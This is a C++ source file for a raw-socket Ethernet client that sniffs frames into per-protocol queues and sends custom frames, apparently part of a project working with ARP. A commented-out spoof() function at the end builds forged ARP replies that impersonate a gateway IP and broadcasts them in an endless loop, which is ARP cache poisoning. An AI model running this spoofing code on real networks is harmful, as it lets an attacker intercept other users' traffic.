#include "ethernet_conn_client.h"

#include <iostream>
#include <netinet/ip.h>
#include <cstring>
#include <linux/if.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include "mac_addr.h"

using namespace std;

char *INTERFACE = "enp0s3";

mac_addr get_my_mac_address(const char *interface_name) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", interface_name);

    int temp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (ioctl(temp_fd, SIOCGIFHWADDR, &ifr) < 0)
        return {0};
    close(temp_fd);

    mac_addr addr;
    memset(&addr, 0, sizeof(addr));
    memcpy(&addr, ifr.ifr_hwaddr.sa_data, sizeof(addr));

    return addr;
}

void print_mac(mac_addr addr) {
    printf("mac addr is: %02x:%02x:%02x:%02x:%02x:%02x\n",
           (unsigned int) addr.addr[0],
           (unsigned int) addr.addr[1],
           (unsigned int) addr.addr[2],
           (unsigned int) addr.addr[3],
           (unsigned int) addr.addr[4],
           (unsigned int) addr.addr[5]
    );
}

string get_my_priv_ip(const char *interface_name) {

}


//void ethernet_conn_client::register_filter(int prot) {
//    int fd = socket(
//            AF_PACKET,
//            SOCK_RAW,
//            prot
//    );
//    if (fd == -1) {
//        cerr << "socket err" << endl;
//        printf("errno: %d\n", errno);
//        throw;
//    }
//
//    prot_handlers[prot].addit_data = {fd};
//
//}

ethernet_conn_client::ethernet_conn_client() : gateway() {

    my_mac = get_my_mac_address(INTERFACE);

    int temp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

//    /* Get the index of the INTERFACE to send on */
//    memset(&if_idx, 0, sizeof(struct ifreq));
//    strncpy(if_idx.ifr_name, INTERFACE, IFNAMSIZ - 1);
//    if (ioctl(temp_fd, SIOCGIFINDEX, &if_idx) < 0)
//        perror("SIOCGIFINDEX");
//
//    dest_addr.sll_ifindex = if_idx.ifr_ifindex;


    // Get the private ip address of our device
    memset(&my_priv_ip, 0, sizeof(struct ifreq));
    strncpy(my_priv_ip.ifr_name, INTERFACE, IFNAMSIZ - 1);
    if (ioctl(temp_fd, SIOCGIFADDR, &my_priv_ip) < 0)
        perror("SIOCGIFADDR");

    close(temp_fd);


//    memset(&dest_addr, '\x00', sizeof(dest_addr));
//    dest_addr.sll_ifindex = if_idx.ifr_ifindex;


    worker = std::thread([this]() {
#define BUFF_LEN 512
        char buff[BUFF_LEN];
        while (true) {
            memset(&buff, '\x00', BUFF_LEN);

            int sz = gateway.recv_raw(buff, BUFF_LEN);
            if (sz <= 0) continue;

            struct ether_header *eth_header = (struct ether_header *) buff;

            char * data = buff + sizeof(struct ether_header);
            int data_sz = sz - sizeof(struct ether_header);

            uint8_t* alloc_msg = new uint8_t[data_sz];
            memcpy(alloc_msg, data, data_sz);

            protocolQueue.prots[eth_header->ether_type].queue.push(
                    {std::unique_ptr<uint8_t>(alloc_msg), data_sz}
                    );
            if (eth_header->ether_type == htons(ETH_P_ARP)) {
                cout << "just received arp frame" << endl;
            }

        }
    });

    // wait to ensure the thread and the sniffer has started
    sleep(2);
}

ethernet_conn_client::~ethernet_conn_client() {
    worker.detach();
}

void ethernet_conn_client::change_dest_mac(mac_addr mac) {
    dest_device = mac;
}

void ethernet_conn_client::init() {
}

void ethernet_conn_client::finish() {
}




int ethernet_conn_client::recv_next_msg( void *data, int count) {
    if (getNextProt() != htons(ETH_P_ARP))
        throw "not arp";

    while (protocolQueue.prots[htons(ETH_P_ARP)].queue.empty()) {
        using namespace std::chrono_literals;
        std::this_thread::sleep_for(10ms);
    }

    message next_msg = std::move(
            protocolQueue.prots[htons(ETH_P_ARP)].queue.front()
            );
    protocolQueue.prots[htons(ETH_P_ARP)].queue.pop();

    int copy_cnt = std::min(count, next_msg.sz);
    memcpy(data, next_msg.data.get(), copy_cnt);
    return copy_cnt;
}

int ethernet_conn_client::send_next_msg( void *data, int count) {
#define BUFF_LEN 512
    char buff[BUFF_LEN];
    memset(buff, 0, BUFF_LEN);

    // setup ethernet
    struct ether_header *eth_header = (struct ether_header *) buff;

    // dest mac addr
    memcpy(eth_header->ether_dhost, &dest_device, ETH_ALEN);
//    memset(eth_header->ether_dhost, 0xff, ETH_ALEN); // send to broadcast

// source (my mac)
    memcpy(eth_header->ether_shost, &my_mac, ETH_ALEN); // my mac

    // ethertype
    eth_header->ether_type = getNextProt();


    char* frame_data = buff + sizeof(struct ether_header);
    memcpy(frame_data, data, count);

    // just before sending, make sure there is a file descriptor for this protocol
//    if (!prot_handlers.count(getNextProt())) register_filter(getNextProt());
//
//    return sendto(prot_handlers[getNextProt()].addit_data.fd,
//                  buff, sizeof(struct ether_header) + count,
//                  0,
//                  reinterpret_cast<const sockaddr *>(&dest_addr), sizeof(dest_addr));

    return gateway.send_raw(buff, sizeof(struct ether_header) + count);

}




#define IP4LEN 4
//void ethernet_conn_client::spoof() {
//
//    struct in_addr gateway_ip = {0};
//    if (!inet_aton("10.100.102.1", &gateway_ip))
//        throw "can't convert gateway's ip";
//
////    mac_addr victim_mac = {0x20, 0x7b, 0xd2, 0xaf, 0xdb, 0xc9};
////    struct in_addr victim_ip = {0};
////    if (!inet_aton("10.100.102.15", &victim_ip))
////        throw "can't convert civtim's ip";
//
//
//#define BUFF_LEN 512
//    char buff[BUFF_LEN];
//    memset(buff, 0, BUFF_LEN);
//
//
//    // setup ethernet
//    struct ether_header *eth_header = (struct ether_header *) buff; // ethernet header
//
//    memset(eth_header->ether_dhost, 0xff, ETH_ALEN); // send to broadcast
//    memcpy(eth_header->ether_shost, &my_mac, ETH_ALEN); // my mac
//    eth_header->ether_type = htons(ETH_P_ARP); // ethertype: arp
//
//
//    // setup arp
//    struct ether_arp *arp_header = (struct ether_arp *) (buff + sizeof(struct ether_header)); // arp_header header
//    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
//    arp_header->arp_pro = htons(ETH_P_IP); // first arp addr type: ip
//    arp_header->arp_hln = ETH_ALEN; // len of mac addr
//    arp_header->arp_pln = IP4LEN; // len of ip addr
//    arp_header->arp_op = htons(ARPOP_REPLY); // type of arp (forged reply)
//
//    memcpy(arp_header->arp_sha, &my_mac, sizeof(arp_header->arp_sha)); // my mac spoofed
//    memcpy(arp_header->arp_spa, &gateway_ip, sizeof(arp_header->arp_spa)); // gateway ip
//
//    memset(arp_header->arp_tha, 0xff, ETH_ALEN);
//    memset(arp_header->arp_tpa, 0x00, IP4LEN);
////    memcpy(arp_header->arp_tha, &victim_mac, sizeof(arp_header->arp_tha));
////    memcpy(arp_header->arp_tpa, &victim_ip, sizeof(arp_header->arp_tpa));
//
//
//
//    int fd = socket(AF_PACKET,
//                    SOCK_RAW,
//                    htons(ETH_P_ARP));
//
//    while (true) {
//        using namespace std::chrono_literals;
//        std::this_thread::sleep_for(500ms);
//
//        sendto(fd,
//               buff, sizeof(struct ether_header) + sizeof(struct ether_arp),
//               0,
//               reinterpret_cast<const sockaddr *>(&dest_addr), sizeof(dest_addr));
//    }
//}

